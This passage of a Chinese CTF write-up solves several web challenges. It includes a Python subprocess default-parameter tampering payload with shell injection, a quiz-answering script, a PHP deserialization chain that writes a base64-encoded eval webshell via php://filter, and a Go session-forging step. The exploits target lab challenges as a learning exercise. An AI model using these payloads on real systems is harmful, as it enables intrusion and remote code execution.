<span class="hljs-comment">#这个函数类似于gett，但用于设置一个具有指定值（num）的属性。</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sett</span>(<span class="hljs-params">obj,arg,num</span>):
    tmp = obj
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(arg)-<span class="hljs-number">1</span>):
        tmp = <span class="hljs-built_in">getattr</span>(tmp,arg[i])
    <span class="hljs-built_in">setattr</span>(tmp,arg[i+<span class="hljs-number">1</span>],num)

<span class="hljs-comment">#它从subprocess中提取特定属性，将其转换为列表，使用给定的索引num和布尔值bol修改列表中的特定元素，然后将属性设置回修改后的列表。 </span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>(<span class="hljs-params">giveme,num,bol</span>):
    c = gett(subprocess,giveme)
    tmp = <span class="hljs-built_in">list</span>(c)
    tmp[num] = bol
    tmp = <span class="hljs-built_in">tuple</span>(tmp)
    sett(subprocess,giveme,tmp)

    <span class="hljs-comment">#这个函数用于使用subprocess.call方法执行Shell命令。</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">arg</span>):
    subprocess.call(arg)


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span>,methods=[<span class="hljs-string">'GET'</span>,<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">exec</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">'exec'</span>)==<span class="hljs-string">'ok'</span>:
            shell = request.args.get(<span class="hljs-string">'shell'</span>)
            cmd(shell)
        <span class="hljs-keyword">else</span>:
            exp = <span class="hljs-built_in">list</span>(request.get_json()[<span class="hljs-string">'exp'</span>])
            num = <span class="hljs-built_in">int</span>(request.args.get(<span class="hljs-string">'num'</span>))
            bol = <span class="hljs-built_in">bool</span>(request.args.get(<span class="hljs-string">'bol'</span>))
            hint(exp,num,bol)
        <span class="hljs-keyword">return</span> <span class="hljs-string">'ok'</span>
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'error'</span>
    
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>,port=<span class="hljs-number">5000</span>)</code></pre>
<p>附件给了我们源码，这里配合GPT做了一波审计，下面附上关键函数的用法截图：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231103195044902.png" alt="image-20231103195044902"></p>
<p>这里分析了一波，我们来搞一下思路，这里的代码可以实现修改subprocess函数的某些属性，如果我们传入恶意数据就可以修改我们想要的属性的值了。</p>
<p>这里我们可以json传入数据，也就是传入subprocess函数的某些参数，随后num定位我们想要修改的参数位置，bol是修改参数的布尔值，这样传入之后可以通过gett，sett函数的配合，将参数的布尔值修改为我们想要的布尔值。–这里也是通过wp学到了一些审计代码的小知识吧。我们将代码通过pycharm打开来搜索一些代码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231103195829002.png" alt="image-20231103195829002"></p>
<p>如上图我们看到敏感函数call，我们跟踪看一下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231103195857003.png" alt="image-20231103195857003"></p>
<p>我们看到这里接受三个参数，但实际有执行功能的似乎是popen，我们继续跟踪看一下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231103195931464.png" alt="image-20231103195931464"></p>
<p>我们看到其init属性中存在诸多参数，其中有shell的默认值为false，我们看一下官方的提示：</p>
<pre><code class="hljs plaintext">Subprocess.call函数有一个参数shell，当shell为True时，执行命令时是/bin/sh -c “$cmd”这样的，可以进行命令注入。而当shell为false时，执行命令时是/bin/cmd arg这种。而这个方法的shell参数默认为false。</code></pre>
<p>因此我们要令shell为true才可以，这里就是想办法修改其布尔值了</p>
<p>根据函数的默认参数保存在defaults属性中，我们在终端看一下其位置</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231103201618954.png" alt="image-20231103201618954"></p>
<p>如上图可以看到位置在第八个，也就是下标为7，我们给num赋值为7即可</p>
<p>我们构造如下payload，注：json格式，bol为字符串，exp的格式为数组（用来被gett遍历）</p>
<pre><code class="hljs json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"exp"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span>
		<span class="hljs-string">"Popen"</span><span class="hljs-punctuation">,</span>
		<span class="hljs-string">"__init__"</span><span class="hljs-punctuation">,</span>
		<span class="hljs-string">"__default__"</span>
    <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>

get传参：?num=<span class="hljs-number">7</span>&amp;bol=<span class="hljs-literal"><span class="hljs-keyword">true</span></span>&amp;shell=mkdir%<span class="hljs-number">20.</span>/static;cat%<span class="hljs-number">20</span>/flag&gt;./static/<span class="hljs-number">1.</span>txt&amp;exec=oka</code></pre>
<p>接下来令exec不为ok即可进入else语句–这里注意content-type的内容</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231103203437201.png" alt="image-20231103203437201"></p>
<p>下面要get传参，令exec=ok进入cmd命令执行状态</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231103203755216.png" alt="image-20231103203755216"></p>
<p>拿到flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231103203810165.png" alt="image-20231103203810165"></p>
<h3 id="week3快问快答">[WEEK3]快问快答</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231031181934913.png" alt="image-20231031181934913"></p>
<p>直接看题目源码，很明显是要写脚本的，由于本人太菜，所以就跟着别的佬去写了。</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">def</span> <span class="hljs-title function_">post_answer</span>(<span class="hljs-params">url, headers, answer, cookie</span>):<span class="hljs-comment">#发送请求</span>
   answer1 = {<span class="hljs-string">'answer'</span>: answer}
   response=requests.Session()
   response = response.post(url, headers=headers, data=answer1,cookies=cookie)<span class="hljs-comment">#这个需要设cookie，因为每道题的cookie都是不同的</span>
   <span class="hljs-keyword">return</span> response
 
<span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_question</span>(<span class="hljs-params">response</span>):<span class="hljs-comment">#用于计算答案</span>
   html = response.text
   answer=<span class="hljs-number">0</span>
   pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r"&lt;h3&gt;(.*?)&lt;/h3&gt;"</span>)<span class="hljs-comment">#(.*?)：这是正则表达式的一部分，用于捕获任何字符（除了换行符 \n）零次或多次，非贪婪地匹配，其中的r是为了让其中的反斜杠字符视为普通字符</span>
   <span class="hljs-keyword">match</span> = pattern.search(html)
   <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:
       question = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)
       numbers = re.findall(<span class="hljs-string">r"\d+"</span>, question)
       operation = re.findall(<span class="hljs-string">r'异或|与|\+|-|x|÷'</span>, question)<span class="hljs-comment">#识别运算符</span>
       op=operation[<span class="hljs-number">0</span>]
       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(numbers) == <span class="hljs-number">2</span>:
           a = <span class="hljs-built_in">int</span>(numbers[<span class="hljs-number">0</span>])
           b = <span class="hljs-built_in">int</span>(numbers[<span class="hljs-number">1</span>])
           <span class="hljs-keyword">if</span> op == <span class="hljs-string">"异或"</span>:
               answer = a ^ b
           <span class="hljs-keyword">if</span> op == <span class="hljs-string">"与"</span>:
               answer = a &amp; b
           <span class="hljs-keyword">if</span> op == <span class="hljs-string">"-"</span>:
               answer = a - b
           <span class="hljs-keyword">if</span> op == <span class="hljs-string">"+"</span>:
               answer = a + b
           <span class="hljs-keyword">if</span> op == <span class="hljs-string">"x"</span>:
               answer = a * b
           <span class="hljs-keyword">if</span> op == <span class="hljs-string">"÷"</span>:
               answer = <span class="hljs-built_in">int</span>(a/b)<span class="hljs-comment">#这里要特别注意要强转成整形，因为题目只能提交整数，如果不转，脚本运行的时候，会因为提交无效数据而爆500的错误</span>
           <span class="hljs-comment">#print(question)</span>
           <span class="hljs-comment">#print(answer)</span>
   <span class="hljs-keyword">else</span>:
           <span class="hljs-built_in">print</span>(<span class="hljs-string">"找不到题目"</span>)
   <span class="hljs-keyword">return</span> answer
 
url = <span class="hljs-string">"http://112.6.51.212:32776/"</span>  <span class="hljs-comment"># 这里替换为你要访问的网址</span>
headers = {<span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/x-www-form-urlencoded"</span>}
cookie=<span class="hljs-number">0</span>
answer = <span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">52</span>):<span class="hljs-comment">#这里要设置成52，相当于循环了51次，因为第一次是初始化，答案是错的</span>
       time.sleep(<span class="hljs-number">1</span>)<span class="hljs-comment">#这里是为了别让程序答得太快，因为题目答题速度是1到2秒之间</span>
       response = post_answer(url, headers, answer, cookie)
       <span class="hljs-built_in">print</span>(response.text)<span class="hljs-comment">#打印表单</span>
       answer = parse_question(response)
       cookie = response.cookies</code></pre>
<p>拿到flag，感觉这个脚本还是有难度的。。。。我先练习一波</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231031183614448.png" alt="image-20231031183614448"></p>
<p>之后又研究了一波代码，发现<code>match.group(1)</code>此处是必须为1的，如果为0输出如下：很明显会导致我们后续对数字的判断错误</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231031190928323.png" alt="image-20231031190928323"></p>
<h3 id="week3sseerriiaalliizzee">[WEEK3]sseerriiaalliizzee</h3>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$barking</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;barking = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;barking-&gt;<span class="hljs-title function_ invoke__">dosomething</span>();
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>{ 
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part1</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part2</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$part1</span>=<span class="hljs-string">''</span>,<span class="hljs-variable">$part2</span>=<span class="hljs-string">''</span></span>) </span>{
        <span class="hljs-variable language_">$this</span> -&gt; part1 = <span class="hljs-variable">$part1</span>;
        <span class="hljs-variable language_">$this</span> -&gt; part2 = <span class="hljs-variable">$part2</span>;
        
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dosomething</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable">$useless</span>   = <span class="hljs-string">'&lt;?php die("+Genshin Impact Start!+");?&gt;'</span>;
        <span class="hljs-variable">$useful</span>= <span class="hljs-variable">$useless</span>. <span class="hljs-variable language_">$this</span>-&gt;part2;
        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt; part1,<span class="hljs-variable">$useful</span>);
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dosomething</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">include</span>(<span class="hljs-string">'./flag,php'</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"barking for fun!"</span>;
        
    }
}

    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'code'</span>]; 
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$code</span>)){
       <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$code</span>);
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"no way, fuck off"</span>;
    }
<span class="hljs-meta">?&gt;</span> 
no way, fuck off</code></pre>
<p>这道题目链子很容易分析，tostring魔术方法的调用在echo 反序列化处就会调用的，难点是利用点在CTF类中的<code>$useful= $useless. $this-&gt;part2;</code>处，但我们可以看到他之前是有一个内容为php代码，其中含有die，这会导致程序的直接退出。此时让我想到了PHP的死亡die绕过，记得p神讲过的：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a>–我只能说讲得真通俗易懂，这里截取关键部分</p>
<pre><code class="hljs plaintext">幸运的是，这里的$_POST['filename']是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将$content解码，利用php base64_decode函数特性去除“死亡exit”。

众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。

所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</code></pre>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'txt'</span>] = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'|[^a-z0-9A-Z+/]|s'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'txt'</span>]);
<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'txt'</span>]);</code></pre>
<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，"phpexita"被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
<p>根据上述理论我们看一下<code>&lt;?php die("+Genshin Impact Start!+");?&gt;</code>在经过base64解码的时候会将<code>&lt;、?、;、(、)</code>忽略，也就是说最后只剩下<code>phpdie+GenshinImpactStart+</code>共26个字符，考虑到base64特性我们需要增添两个字符使其为4的倍数也就是28，最终payload如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$barking</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part1</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part2</span>;
}

<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();
<span class="hljs-variable">$poc</span>-&gt;barking = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();
<span class="hljs-variable">$poc</span>-&gt;barking-&gt;part1 = <span class="hljs-string">'php://filter/write=convert.base64-decode/resource=cmd.php'</span>;
<span class="hljs-variable">$poc</span>-&gt;barking-&gt;part2 = <span class="hljs-string">'aaPD9waHAgQGV2YWwoJF9QT1NUWydoeWJjeCddKTs/Pg=='</span>; <span class="hljs-comment">//注意这里前面有两个字符aa</span>
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231031202036768.png" alt="image-20231031202036768"></p>
<p>上传访问即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231031202111335.png" alt="image-20231031202111335"></p>
<p>拿到flag</p>
<p>另外的各种姿势还可参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/12650702.html">file_put_contents利用技巧(php://filter协议)</a></p>
<h3 id="week3gogogo">[WEEK3]gogogo</h3>
<p>这道题根据附件来看是一道go语言审计题目，这也是第一次遇见。。。先自己审计一波</p>
<p>main.go</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"main/route"</span>

	<span class="hljs-string">"github.com/gin-gonic/gin"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	r := gin.Default()
	r.GET(<span class="hljs-string">"/"</span>, route.Index)
	r.GET(<span class="hljs-string">"/readflag"</span>, route.Readflag)
	r.Run(<span class="hljs-string">"0.0.0.0:8000"</span>)
}</code></pre>
<p>route.go</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> route

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"github.com/gin-gonic/gin"</span>
	<span class="hljs-string">"github.com/gorilla/sessions"</span>
	<span class="hljs-string">"main/readfile"</span>
	<span class="hljs-string">"net/http"</span>
	<span class="hljs-string">"os"</span>
	<span class="hljs-string">"regexp"</span>
)

<span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">"SESSION_KEY"</span>)))


<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(c *gin.Context)</span></span> {
	session, err := store.Get(c.Request, <span class="hljs-string">"session-name"</span>)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">"name"</span>] == <span class="hljs-literal">nil</span> {
		session.Values[<span class="hljs-string">"name"</span>] = <span class="hljs-string">"User"</span>
		err = session.Save(c.Request, c.Writer)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
			<span class="hljs-keyword">return</span>
		}
	}

	c.String(<span class="hljs-number">200</span>, <span class="hljs-string">"Hello, User. How to become admin?"</span>)

}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Readflag</span><span class="hljs-params">(c *gin.Context)</span></span> {
	session, err := store.Get(c.Request, <span class="hljs-string">"session-name"</span>)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">"name"</span>] == <span class="hljs-string">"admin"</span> {
		c.String(<span class="hljs-number">200</span>, <span class="hljs-string">"Congratulation! You are admin,But how to get flag?\n"</span>)

		path := c.Query(<span class="hljs-string">"filename"</span>)

		reg := regexp.MustCompile(<span class="hljs-string">`[b-zA-Z_@#%^&amp;*:{|}+&lt;&gt;";\[\]]`</span>)

		<span class="hljs-keyword">if</span> reg.MatchString(path) {

			http.Error(c.Writer, <span class="hljs-string">"nonono"</span>, http.StatusInternalServerError)
			<span class="hljs-keyword">return</span>
		}

		<span class="hljs-keyword">var</span> data []<span class="hljs-type">byte</span>
		<span class="hljs-keyword">if</span> path != <span class="hljs-string">""</span> {
			data = readfile.ReadFile(path)
		} <span class="hljs-keyword">else</span> {
			data = []<span class="hljs-type">byte</span>(<span class="hljs-string">"请传入参数"</span>)
		}

		c.JSON(<span class="hljs-number">200</span>, gin.H{
			<span class="hljs-string">"success"</span>: <span class="hljs-string">"read: "</span> + <span class="hljs-type">string</span>(data),
		})
	} <span class="hljs-keyword">else</span> {
		c.String(<span class="hljs-number">200</span>, <span class="hljs-string">"Hello, User. How to become admin?"</span>)
	}

}</code></pre>
<p>readfile.go</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> readfile

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"os/exec"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadFile</span><span class="hljs-params">(path <span class="hljs-type">string</span>)</span></span> (string2 []<span class="hljs-type">byte</span>) {
	<span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
		panic_err := <span class="hljs-built_in">recover</span>()
		<span class="hljs-keyword">if</span> panic_err != <span class="hljs-literal">nil</span> {

		}
	}()
	cmd := exec.Command(<span class="hljs-string">"bash"</span>, <span class="hljs-string">"-c"</span>, <span class="hljs-string">"strings  "</span>+path)
	string2, err := cmd.Output()
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		string2 = []<span class="hljs-type">byte</span>(<span class="hljs-string">"文件不存在"</span>)
	}
	<span class="hljs-keyword">return</span> string2
}</code></pre>
<p>看了一波感觉是session伪构造，其中要求我们的name为admin才能有读取flag的权限，但是session.name是加密过的：</p>
<pre><code class="hljs go"><span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">"SESSION_KEY"</span>)))</code></pre>
<p>这里看到是以session_key密钥加密，这时候神奇的思路就来了，佬们都直接盲猜题目没有该环境变量，于是想着直接搭建到本地运行得到session，在此之前我们看一下这个</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231031212206314.png" alt="image-20231031212206314"></p>
<p>可以看到我们当前的name为User根据上述index处的代码我们知道当name=nil的时候，才会赋值为User，这说明在此之前我们的name一定是nil，此时如果我们修改这个代码</p>
<pre><code class="hljs go">session.Values[<span class="hljs-string">"name"</span>] = <span class="hljs-string">"User"</span>
改为
session.Values[<span class="hljs-string">"name"</span>] = <span class="hljs-string">"admin"</span></code></pre>
<p>那此时运行完之后我们的session.name一定是admin，思路打通了，那直接本地搭建即可</p>
<p>这里也是搭建了很长时间，一直报错。。。但功夫不负有心人还是搭建好了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231031223645605.png" alt="image-20231031223645605"></p>
<pre><code class="hljs plaintext">MTY5ODc2Mjk1NHxEWDhFQVFMX2dBQUJFQUVRQUFBaV80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJnQUVWWE5sY2c9PXwIajflC8tQIWBj_C6y_TRCb3QZo-mQ9nhVjtatkQ3nbg==

MTY5ODc1NDk2OHxEdi1CQkFFQ180SUFBUkFCRUFBQUl2LUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBWUFCRlZ6WlhJPXzzzlJr4E_S8XnoBRbpogEHKAVkSrz_YsNvqNpca0wA6g==

MTY5ODc2Mjk1NHxEWDhFQVFMX2dBQUJFQUVRQUFBaV80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJnQUVWWE5sY2c9PXwIajflC8tQIWBj_C6y_TRCb3QZo-mQ9nhVjtatkQ3nbg==</code></pre>
<p>我们访问127.0.0.1:8000得到session，如上所示，最后看一下readfile函数</p>
